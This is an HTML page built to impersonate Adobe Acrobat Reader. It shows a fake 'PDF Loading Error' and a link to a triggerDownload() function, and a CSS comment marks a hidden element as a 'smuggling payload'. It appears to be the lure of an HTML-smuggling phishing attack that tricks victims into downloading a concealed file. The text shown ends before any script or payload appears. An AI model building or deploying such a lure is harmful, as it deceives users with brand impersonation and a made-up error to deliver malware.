<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat Reader</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            overflow: hidden;
        }
        .container {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .toolbar {
            background-color: #333;
            color: white;
            padding: 5px 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        .toolbar-left {
            display: flex;
            align-items: center;
        }
        .toolbar-left img {
            height: 24px;
            margin-right: 10px;
        }
        .toolbar-left span {
            font-size: 14px;
            font-weight: bold;
        }
        .toolbar-right {
            display: flex;
            gap: 10px;
        }
        .toolbar-right button {
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 14px;
        }
        .content {
            flex-grow: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #fff;
            border: 1px solid #ccc;
            margin: 10px;
        }
        .error-message {
            text-align: center;
            padding: 20px;
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 5px;
            max-width: 500px;
        }
        .error-message h2 {
            color: #721c24;
            font-size: 18px;
            margin: 0 0 10px;
        }
        .error-message p {
            color: #721c24;
            font-size: 14px;
            margin: 0 0 15px;
        }
        .error-message a {
            color: #0056b3;
            text-decoration: underline;
            cursor: pointer;
        }
        /* Hidden smuggling payload */
        #smuggledPayload {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Toolbar mimicking Adobe Acrobat Reader -->
        <div class="toolbar">
            <div class="toolbar-left">
                <img src="https://www.adobe.com/favicon.ico" alt="Adobe Logo">
                <span>Adobe Acrobat Reader DC - Document.pdf</span>
            </div>
            <div class="toolbar-right">
                <button>View</button>
                <button>Edit</button>
                <button>Sign</button>
                <button>Tools</button>
                <button>Window</button>
                <button>Help</button>
            </div>
        </div>
        <!-- Main content with fake error -->
        <div class="content">
            <div class="error-message">
                <h2>PDF Loading Error</h2>
                <p>Sorry, there was an issue loading "Document.pdf". The file may be corrupted or incompatible with this viewer.</p>
                <p>Please <a onclick="triggerDownload()">download the file</a> to try opening it with an alternative viewer.</p>
            </div>
        </div>
    </div>
